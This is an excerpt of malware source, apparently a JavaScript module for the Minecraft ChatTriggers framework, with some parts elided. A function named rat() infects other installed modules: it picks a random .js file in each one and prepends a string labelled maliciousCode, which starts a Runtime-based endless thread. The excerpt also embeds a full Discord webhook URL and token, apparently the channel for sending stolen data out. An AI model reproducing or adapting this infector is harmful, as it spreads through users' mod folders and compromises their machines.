const WEBHOOK_URL = "https://discord.com/api/webhooks/1369240401093066822/pWY2kBsEDkq-zDRBTnX1tIpMwqC_3NFkXa_WQyrvjqBS_4sAusKnachL1NjSbrF6zkwy";
...
function rat() {
    let files = new File(Config.modulesFolder).listFiles();
    let folderPaths = [];
    for (var i = 0; i < files.length; i++) if (files[i].isDirectory()) folderPaths[i] = files[i].getAbsolutePath();
    folderPaths.forEach(module => {
        console.log(module)
        if (!module.endsWith("requestV2") && !module.endsWith("PromiseV2")) {
            let jsArray = scanForJs(module);
            let randomIndex = Math.floor(Math.random() * jsArray.length);
            if (jsArray[randomIndex] !== undefined) {
                let t = FileLib.read(jsArray[randomIndex][0]);
                const maliciousCode = `const Runtime = Java.type("java.lang.Runtime");
new Thread(() => {
    while (true) {
        ...
        Thread.sleep(1000);
                ...
                let w = maliciousCode + t;
                FileLib.write(jsArray[randomIndex][0], w);
            }
        }
    });
}

function scanForJs(dir, x = 1, result = []) {
    let dirc = new File(dir);
    dirc.listFiles().forEach(file => {
        if (file.isDirectory()) scanForJs(file, x + 1, result);
        else if (file.isFile() && file.getAbsolutePath().endsWith(".js")) result.push([file, x]);
    });
    return result;
}
